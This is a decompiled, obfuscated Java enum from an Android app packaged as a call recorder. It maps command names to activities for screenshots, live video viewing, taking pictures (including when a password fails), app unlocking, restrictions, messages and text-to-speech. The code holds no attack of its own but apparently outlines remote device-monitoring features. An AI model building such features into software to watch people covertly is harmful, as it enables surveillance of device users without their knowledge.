package com.yasoka.spcallrecord.recorder.call.a.c.j;

import com.app.action.AndroidTextToSpeechActivity;
import com.app.activity.ActivityMessage;
import com.app.activity.ActivityRestriction;
import com.app.activity.ActivityUnLockApp;
import com.app.activity.BugAllActivity;
import com.app.activity.ScreenActivity;
import com.app.activity.ScreenshotActivity;
import com.app.activity.liveViewving.LiveRTCActivity;
import com.app.activity.picture.ActivityPicture;
import com.app.activity.picture.ActivityPictureCamera2;
import com.app.activity.picture.ActivityPicturePasswordFailedCamera2;

/* compiled from: NameActivity */
public enum b {
    SCREENSHOT {
        public Class<?> a() {
            return ScreenshotActivity.class;
        }
    },
    SCREEN {
        public Class<?> a() {
            return ScreenActivity.class;
        }
    },
    EXCEPTION_ALL {
        public Class<?> a() {
            return com.app.activity.h.class;
        }
    },
    BUG_ALL {
        public Class<?> a() {
            return BugAllActivity.class;
        }
    },
    UNLOCK_APP {
        public Class<?> a() {
            return ActivityUnLockApp.class;
        }
    },
    RESTRICTION {
        public Class<?> a() {
            return ActivityRestriction.class;
        }
    },
    LIVERTC {
        public Class<?> a() {
            return LiveRTCActivity.class;
        }
    },
    LIVERTCFINISH {
        public Class<?> a() {
            return LiveRTCActivity.class;
        }
    },
    TAKE_PICTURE {
        public Class<?> a() {
            return ActivityPicture.class;
        }
    },
    TAKE_PICTURE_CAMERA_2 {
        public Class<?> a() {
            return ActivityPictureCamera2.class;
        }
    },
    TAKE_PICTURE_PASSWORD_FAILED_CAMERA_2 {
        public Class<?> a() {
            return ActivityPicturePasswordFailedCamera2.class;
        }
    },
    MESSAGE {
        public Class<?> a() {
            return ActivityMessage.class;
        }
    },
    TEXT_TO_SPEECH {
        public Class<?> a() {
            return AndroidTextToSpeechActivity.class;
        }
    };

    public abstract Class<?> a();
}
